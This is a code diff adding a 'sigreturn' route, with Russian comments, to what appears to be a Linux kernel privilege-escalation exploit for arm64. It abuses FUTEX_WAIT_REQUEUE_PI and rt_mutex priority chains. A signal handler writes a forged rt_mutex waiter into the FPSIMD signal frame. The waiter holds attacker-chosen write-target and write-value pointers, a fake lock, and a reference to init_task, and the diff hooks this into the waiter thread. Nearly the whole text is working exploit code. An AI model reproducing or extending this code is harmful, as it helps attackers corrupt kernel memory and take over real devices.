@@ -18,6 +18,99 @@ atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+
+/* === SIGRETURN FPSIMD PANIC REPRO === */
+#include <signal.h>
+#include <asm/sigcontext.h>
+
+static volatile int sigreturn_done = 0;
+static unsigned char g_fake_waiter[0x58];
+
+static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext)
+{
+    (void)sig; (void)info;
+    ucontext_t *uc = (ucontext_t *)ucontext;
+    mcontext_t *mc = &uc->uc_mcontext;
+    unsigned char *base = (unsigned char *)mc;
+
+    for (int off = 0; off < 1024; off += 8) {
+        if (*(uint32_t *)(base + off) == FPSIMD_MAGIC) {
+            struct fpsimd_context *fpsimd = (struct fpsimd_context *)(base + off);
+            uint8_t *vregs = (uint8_t *)&fpsimd->vregs[0];
+            memcpy(vregs + 0x18, g_fake_waiter, 0x58);
+            sigreturn_done = 1;
+            return;
+        }
+    }
+}
+
+/* fallback если pselect_write_value/target не видны */
+#ifndef pselect_write_value
+static uint64_t pselect_write_value(void) { return 0; }
+static uint64_t pselect_write_target(void) { return 0; }
+#endif
+
+void do_sigreturn_fake_lock_route(void)
+{
+    if (!page_base || !fake_lock || !fake_fops) {
+        pr_error("sigreturn route missing page=%016zx lock=%016zx fops=%016zx\n",
+                 page_base, fake_lock, fake_fops);
+        return;
+    }
+
+    memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
+
+    /* ТОЧНЫЙ layout, который вызвал panic в rt_mutex_adjust_prio_chain */
+    put64(g_fake_waiter, 0x10, pselect_write_value());   /* tree_pc */
+    put64(g_fake_waiter, 0x18, 0);                        /* tree_right */
+    put64(g_fake_waiter, 0x20, pselect_write_target());   /* tree_left */
+    put64(g_fake_waiter, 0x28, pselect_write_value());    /* pi_parent */
+    put64(g_fake_waiter, 0x30, 0);                        /* pi_right */
+    put64(g_fake_waiter, 0x38, pselect_write_target());   /* pi_left */
+    put64(g_fake_waiter, 0x40, text_addr(INIT_TASK));     /* task */
+    put64(g_fake_waiter, 0x48, fake_lock);                /* lock */
+    put64(g_fake_waiter, 0x50, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3); /* prio */
+
+    struct sigaction sa = {0};
+    sa.sa_sigaction = sigreturn_handler;
+    sa.sa_flags = SA_SIGINFO | SA_RESTART;
+    sigaction(SIGUSR1, &sa, NULL);
+
+    usleep(50000);
+
+    int tid = atomic_load(&waiter_tid);
+    if (tid <= 0) {
+        pr_error("sigreturn route no waiter tid\n");
+        return;
+    }
+
+    sigreturn_done = 0;
+    syscall(SYS_tgkill, getpid(), tid, SIGUSR1);
+
+    while (!sigreturn_done)
+        sched_yield();
+
+    atomic_store(&punch_consume_go, 1);
+
+    int waited = 0;
+    while (waited < 500000) {
+        int c = atomic_load(&consumer_calls);
+        int s = atomic_load(&consumer_success);
+        if (c > 0 && s > 0)
+            break;
+        if (cfi_dirty_seen)
+            break;
+        usleep(1000);
+        waited += 1000;
+    }
+
+    atomic_store(&punch_consume_go, 0);
+    pr_info("sigreturn route done calls=%d success=%d\n",
+            atomic_load(&consumer_calls), atomic_load(&consumer_success));
+}
+/* === END SIGRETURN REPRO === */
+
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
@@ -41,6 +134,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
 
   do_pselect_fake_lock_route();
+  do_sigreturn_fake_lock_route();
   atomic_store(&route_done, 1);
 
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
